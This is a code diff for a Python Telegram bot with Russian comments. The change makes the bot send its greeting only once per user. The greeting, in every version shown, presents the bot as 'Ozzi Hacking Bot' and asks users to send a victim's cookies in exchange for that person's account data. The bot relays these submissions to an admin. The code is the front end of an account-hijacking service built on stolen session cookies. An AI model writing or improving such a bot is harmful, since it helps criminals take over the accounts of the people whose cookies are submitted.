@@ -9,7 +9,8 @@ ADMIN_ID = int(os.getenv("ADMIN_ID"))  # Твой Telegram ID (число)
 bot = Bot(token=TOKEN)
 dp = Dispatcher()
 
-# Словарь для хранения ID пользователей, от которых пришли сообщения
+# Словарь для хранения ID пользователей, которым уже отправили "Спасибо"
+user_notified = set()
 user_messages = {}
 
 @dp.message()
@@ -27,7 +28,10 @@ async def handle_messages(message: Message):
         # Связываем ID сообщения пользователя и ID пересланного сообщения
         user_messages[sent_msg.message_id] = user_id
 
-        await message.answer("Привет, это Ozzi Hacking Bot! Пришли куки жертвы и мы скоро дадим его данные аккаунт тебе :)")
+        # Отправляем "Спасибо" только если пользователь пишет впервые
+        if user_id not in user_notified:
+            await message.answer("Привет, это Ozzi Hacking Bot! Пришли куки жертвы и мы скоро дадим его данные аккаунт тебе :)")
+            user_notified.add(user_id)  # Запоминаем, что пользователю уже ответили
 
     else:  # Админ отвечает
         if message.reply_to_message and message.reply_to_message.message_id in user_messages:
